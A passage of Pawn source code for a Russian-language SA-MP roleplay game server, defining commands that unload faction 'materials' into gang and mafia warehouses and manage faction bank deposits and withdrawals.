	}
	return true;
}
CMD:bunload(playerid, params[])
{
	if(!IsABiker(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
 	switch(PlayerInfo[playerid][pMember])
 	{
 	    case 24:
 	    {
 	        if(GetPlayerVehicleID(playerid) != hamccar[10]) return SCM(playerid, COLOR_GREY, " Вы не в фургоне");
 	        if(!PlayerToPoint(30.0, playerid, 681.5627,-473.9190,16.5363)) return SCM(playerid, COLOR_GREY, " Вы не рядом со своим клубом!");
 	        if(vertmatbilsa[hamccar[10]][0] <= 0 || (hamcmatbi+vertmatbilsa[hamccar[10]][0]) >= 99999) return SCM(playerid, COLOR_GREY, " Ваш склад заполнен, либо фургон пуст!");
 	        hamcmatbi += vertmatbilsa[hamccar[10]][0];
			vertmatbilsa[hamccar[10]][0] = 0;
			format(string, 100, " Склад Hell's Angels MC: %i/100000", hamcmatbi);
			SCM(playerid, -1, string);
			SCM(playerid, COLOR_GREEN, " Материалов: 0/10000");
 	    }
 	    case 26:
 	    {
 	        if(GetPlayerVehicleID(playerid) != wmccar[10]) return SCM(playerid, COLOR_GREY, " Вы не в фургоне");
 	        if(!PlayerToPoint(30.0, playerid, 662.8604,1716.4194,7.1875)) return SCM(playerid, COLOR_GREY, " Вы не рядом со своим клубом!");
 	        if(vertmatbilsa[wmccar[10]][0] <= 0 || (wmcmatbi+vertmatbilsa[wmccar[10]][0]) >= 99999) return SCM(playerid, COLOR_GREY, " Ваш склад заполнен, либо фургон пуст!");
            wmcmatbi += vertmatbilsa[wmccar[10]][0];
			vertmatbilsa[wmccar[10]][0] = 0;
			format(string, 100, " Склад Warlocks MC: %i/100000", wmcmatbi);
			SCM(playerid, -1, string);
			SCM(playerid, COLOR_GREEN, " Материалов: 0/10000");
		 }
 	    case 29:
 	    {
 	        if(GetPlayerVehicleID(playerid) != pmccar[10]) return SCM(playerid, COLOR_GREY, " Вы не в фургоне");
 	    	if(!PlayerToPoint(30.0, playerid, -2105.8921,-2480.8372,30.6250)) return SCM(playerid, COLOR_GREY, " Вы не рядом со своим клубом!");
 	    	if(vertmatbilsa[pmccar[10]][0] <= 0 || (pmcmatbi+vertmatbilsa[pmccar[10]][0]) >= 99999) return SCM(playerid, COLOR_GREY, " Ваш склад заполнен, либо фургон пуст!");
            pmcmatbi += vertmatbilsa[pmccar[10]][0];
			vertmatbilsa[pmccar[10]][0] = 0;
			format(string, 100, " Склад Pagans MC: %i/100000", pmcmatbi);
			SCM(playerid, -1, string);
			SCM(playerid, COLOR_GREEN, " Материалов: 0/10000");
		 }
  	}
	return true;
}
CMD:unloading(playerid, params[])
{
	new tmpcar = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 482) return SCM(playerid,COLOR_GREY, " Вы не в фургоне!");
	if(PlayerInfo[playerid][pMember] == 12 && PlayerInfo[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfura[0]][gBallas] <= 0) return SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats += Furi[tmpcar-matsfura[0]][gBallas];
			Furi[tmpcar-matsfura[0]][gBallas] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfura[0]][gBallas]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			if(lcnmats > 100000) lcnmats = 100000;
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfura[0]][gBallas];
			Furi[tmpcar-matsfura[0]][gBallas] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfura[0]][gBallas]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			if(rmmats > 100000) rmmats = 100000;
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfura[0]][gBallas];
			Furi[tmpcar-matsfura[0]][gBallas] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов",Furi[tmpcar-matsfura[0]][gBallas]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			if(yakuzamats > 100000) yakuzamats = 100000;
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(ballasmatbi > 100000) return  SCM(playerid,COLOR_GREY, " Склад заполнен");
		ballasmatbi += Furi[tmpcar-matsfura[0]][gBallas];
		Furi[tmpcar-matsfura[0]][gBallas] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
        format(string, 128, " Материалы: %i/%i", Furi[0][gBallas], maxMats[gBallas]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PlayerInfo[playerid][pMember] == 13 && PlayerInfo[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfuravagos[0]][gVagos] <= 0) return SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats += Furi[tmpcar-matsfuravagos[0]][gVagos];
			Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuravagos[0]][gVagos]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfuravagos[0]][gVagos];
			Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuravagos[0]][gVagos]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfuravagos[0]][gVagos];
			Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuravagos[0]][gVagos]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(vagosmatbi > 100000) return SCM(playerid,COLOR_GREY, " Склад заполнен");
		vagosmatbi += Furi[tmpcar-matsfuravagos[0]][gVagos];
		Furi[tmpcar-matsfuravagos[0]][gVagos] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuravagos[0]][gVagos], maxMats[gVagos]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PlayerInfo[playerid][pMember] == 15 && PlayerInfo[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfuragrove[0]][gGrove] <= 0) return   SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats +=  Furi[tmpcar-matsfuragrove[0]][gGrove];
			Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuragrove[0]][gGrove]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfuragrove[0]][gGrove];
			Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuragrove[0]][gGrove]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfuragrove[0]][gGrove];
			Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuragrove[0]][gGrove]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(groovmatbi > 100000) return   SCM(playerid,COLOR_GREY, " Склад заполнен");
		groovmatbi += Furi[tmpcar-matsfuragrove[0]][gGrove];
		Furi[tmpcar-matsfuragrove[0]][gGrove] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[0][gGrove], maxMats[gGrove]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PlayerInfo[playerid][pMember] == 17 && PlayerInfo[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfuraactek[0]][gAztek] <= 0) return  SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats +=  Furi[tmpcar-matsfuraactek[0]][gAztek];
			Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuraactek[0]][gAztek]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfuraactek[0]][gAztek];
			Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuraactek[0]][gAztek]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfuraactek[0]][gAztek];
			Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfuraactek[0]][gAztek]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(aztekmatbi > 100000) return SCM(playerid,COLOR_GREY, " Склад заполнен");
		aztekmatbi += Furi[tmpcar-matsfuraactek[0]][gAztek];
		Furi[tmpcar-matsfuraactek[0]][gAztek] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[0][gAztek], maxMats[gAztek]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	else if(PlayerInfo[playerid][pMember] == 18 && PlayerInfo[playerid][pRank] >= 3)
	{
		if(Furi[tmpcar-matsfurarifa[0]][gRifa] <= 0) return SCM(playerid,COLOR_GREY, " Не достаточно материалов, для разгрузки");
		if(PlayerToPoint(6.0,playerid,1454.3406,758.1638,11.0234))
		{
			lcnmats +=  Furi[tmpcar-matsfurarifa[0]][gRifa];
			Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfurarifa[0]][gRifa]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад мафии LCN: %i/100000", lcnmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,967.3965,1684.1112,8.8516))
		{
			rmmats += Furi[tmpcar-matsfurarifa[0]][gRifa];
			Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfurarifa[0]][gRifa]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Русской мафии: %i/100000", rmmats);
			SCM(playerid, -1, YCMDstr);
			return true;
		}
		else if(PlayerToPoint(6.0,playerid,1460.3116,2763.8110,10.8203))
		{
			yakuzamats += Furi[tmpcar-matsfurarifa[0]][gRifa];
			Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Материалы разргружены! В фургоне: %i/10000 материалов", Furi[tmpcar-matsfurarifa[0]][gRifa]);
			SCM(playerid, TEAM_GROVE_COLOR, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " Склад Якудза: %i/100000", yakuzamats);
			SCM(playerid, -1,YCMDstr);
			return true;
		}
		if(!IsATerra (playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
		if(rifamatbi > 100000) return   SCM(playerid,COLOR_GREY, " Склад заполнен");
		rifamatbi += Furi[tmpcar-matsfurarifa[0]][gRifa];
		Furi[tmpcar-matsfurarifa[0]][gRifa] = 0;
		SCM(playerid,COLOR_GREEN, " Материалы разгружены");
		format(string, 128, " Материалы: %i/%i", Furi[0][gRifa], maxMats[gRifa]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
	}
	return true;
}
CMD:gbank(playerid, params[])
{
	switch(PlayerInfo[playerid][pMember])
	{
	case 15:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Grove: %i вирт", FracBank[0][fGrove]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 12:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Ballas: %i вирт", FracBank[0][fBallas]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 13:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Vagos: %i вирт", FracBank[0][fVagos]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 17:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Aztec: %i вирт", FracBank[0][fAztek]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	case 18:
		{
			format(YCMDstr, sizeof(YCMDstr), " В банке Rifa: %i вирт", FracBank[0][fRifa]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			return true;
		}
	}
	return true;
}
CMD:gbankwithdraw(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pLeader] == 13 || PlayerInfo[playerid][pLeader] == 17 || PlayerInfo[playerid][pLeader] == 18)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /gbankwithdraw [количество]");
	if(PlayerInfo[playerid][pMember] == 12 && PlayerInfo[playerid][pRank] == 10)
	{
		if(FracBank[0][fBallas] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Ballas нет денег"); return true; }
		if(FracBank[0][fBallas] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Ballas нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Ballas]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fBallas] -= params[0];
		PlayerInfo[playerid][pCash] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Ballas: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Ballas] += params[0];
		printf("Игрок %s снял со счёта Ballas %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 13 && PlayerInfo[playerid][pRank] == 10)
	{
		if(FracBank[0][fVagos] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Vagos нет денег"); return true; }
		if(FracBank[0][fVagos] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Vagos нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Vagos]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fVagos] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Vagos: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Vagos] += params[0];
		printf("Игрок %s снял со счёта Vagos %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 15 && PlayerInfo[playerid][pRank] == 10)
	{
		if(FracBank[0][fGrove] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Grove нет денег"); return true; }
		if(FracBank[0][fGrove] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Grove нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Grove]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fGrove] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Grove: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Grove] += params[0];
		printf("Игрок %s снял со счёта Grove %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 17 && PlayerInfo[playerid][pRank] == 10)
	{
		if(FracBank[0][fAztek] == 0) { SCM(playerid, COLOR_GREY, "В банке банды Aztec нет денег"); return true; }
		if(FracBank[0][fAztek] < params[0]) { SCM(playerid, COLOR_GREY, "В банке банды Aztec нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		FracBank[0][fAztek] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Aztec: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Aztec] += params[0];
		printf("Игрок %s снял со счёта Aztec %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 18 && PlayerInfo[playerid][pRank] == 10)
	{
		if(FracBank[0][fRifa] == 0) { SCM(playerid, COLOR_GREY, " В банке банды Rifa нет денег"); return true; }
		if(FracBank[0][fRifa] < params[0]) { SCM(playerid, COLOR_GREY, " В банке банды Rifa нет столько денег"); return true; }
		if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
		if((limitgang[Rifa]+params[0]) > 100000) return SCM(playerid, COLOR_GREY, " Вы не можете снять больше 100 000 в день!");
		FracBank[0][fRifa] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка банды Rifa: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		limitgang[Rifa] += params[0];
		printf("Игрок %s снял со счёта Rifa %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	return true;
}
CMD:gbankput(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pMember] == 17 || PlayerInfo[playerid][pMember] == 18)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /gbankput [количество]");
	if(params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильное количество денег!"); return true; }
	switch(PlayerInfo[playerid][pMember])
	{
	case 15:
		{
			if(PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fGrove] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Grove: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Grove %i вирт", PlayerInfo[playerid][pName], params[0]);
		}
	case 12:
		{
			if(PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fBallas] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Ballas: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Ballas %i вирт", PlayerInfo[playerid][pName], params[0]);
		}
	case 13:
		{
			if(PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fVagos] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Vagos: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Vagos %i вирт", PlayerInfo[playerid][pName], params[0]);
		}
	case 17:
		{
			if(PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fAztek] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Aztec: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Aztec %i вирт", PlayerInfo[playerid][pName], params[0]);
		}
	case 18:
		{
			if(PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fRifa] += params[0];
			PlayerInfo[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Rifa: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Rifa %i вирт", PlayerInfo[playerid][pName], params[0]);
		}
	}
	return true;
}
CMD:mafiabalance(playerid, params[])
{
	switch(PlayerInfo[playerid][pMember])
	{
	case 6: format(YCMDstr, sizeof(YCMDstr), " В банке мафии Yakuza: %i вирт", MafiaBank[0][nYakuza]);
	case 14: format(YCMDstr, sizeof(YCMDstr), " В банке Русской мафии: %i вирт", MafiaBank[0][nRm]);
	case 5: format(YCMDstr, sizeof(YCMDstr), " В банке мафии LCN: %i вирт", MafiaBank[0][nLcn]);
	default:return true;
	}
	SCM(playerid, 0x6495EDFF, YCMDstr);
	return true;
}
CMD:mafiawithdraw(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pLeader] == 14 || PlayerInfo[playerid][pLeader] == 5)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /mafiawithdraw   или   /mwithdraw [сумма]");
	if(params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
	if(PlayerInfo[playerid][pMember] == 6 && PlayerInfo[playerid][pRank] >= 10)
	{
		if(MafiaBank[0][nYakuza] <= 0) { SCM(playerid, COLOR_GREY, " В банке мафии Yakuza нет денег"); return true; }
		if(MafiaBank[0][nYakuza] < params[0]) { SCM(playerid, COLOR_GREY, " В банке мафии Yakuza нет столько денег"); return true; }
		if((limitmafia[0] + params[0]) > 500000) return SendMes(playerid, COLOR_GREY, " В день лимит снятия 500 000. Вы можете ещё снять %i вирт", (500000 - limitmafia[0]));
		MafiaBank[0][nYakuza] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		limitmafia[0] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка мафии Yakuza: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял со счёта Yakuza %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 14 && PlayerInfo[playerid][pRank] >= 10)
	{
		if(MafiaBank[0][nRm] <= 0) { SCM(playerid, COLOR_GREY, "В банке Русской мафии нет денег"); return true; }
		if(MafiaBank[0][nRm] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Русской мафии нет столько денег"); return true; }
		if((limitmafia[1] + params[0]) > 500000) return SendMes(playerid, COLOR_GREY, " В день лимит снятия 500 000. Вы можете ещё снять %i вирт", (500000 - limitmafia[1]));
		MafiaBank[0][nRm] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		limitmafia[1] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Русской мафии: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял со счёта Russian Mafia %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 5 && PlayerInfo[playerid][pRank] >= 10)
	{
		if(MafiaBank[0][nLcn] <= 0) { SCM(playerid, COLOR_GREY, "В банке мафии LCN нет денег"); return true; }
		if(MafiaBank[0][nLcn] < params[0]) { SCM(playerid, COLOR_GREY, "В банке мафии LCN нет столько денег"); return true; }
        if((limitmafia[0] + params[2]) > 500000) return SendMes(playerid, COLOR_GREY, " В день лимит снятия 500 000. Вы можете ещё снять %i вирт", (500000 - limitmafia[2]));
		MafiaBank[0][nLcn] -= params[0];
		PlayerInfo[playerid][pCash] +=params[0];
		limitmafia[2] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка мафии LCN: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял со счёта LCN %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	return true;
}
CMD:mafiabank(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pLeader] == 14 || PlayerInfo[playerid][pLeader] == 5)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /mafiabank [количество]");
	if(params[0] < 1 || PlayerInfo[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
	if(PlayerInfo[playerid][pMember] == 6 && PlayerInfo[playerid][pRank] > 6)
	{
		MafiaBank[0][nYakuza] += params[0];
		PlayerInfo[playerid][pCash] -=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк мафии Yakuza: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s положил на счёт Yakuza %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 14 && PlayerInfo[playerid][pRank] > 6)
	{
		MafiaBank[0][nRm] += params[0];
		PlayerInfo[playerid][pCash] -=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Русской мафии: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s положил на счёт Russian Mafia %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	else if(PlayerInfo[playerid][pMember] == 5 && PlayerInfo[playerid][pRank] > 6)
	{
		MafiaBank[0][nLcn] += params[0];
		PlayerInfo[playerid][pCash] -=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк мафии LCN: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s положил на счёт LCN %i вирт", PlayerInfo[playerid][pName], params[0]);
	}
	return true;
}
CMD:materials(playerid, params[])
{
	new x_nr[40];
	if(IsPlayerConnected(playerid))
	{
		if(sscanf(params, "s[64]", x_nr))
		{
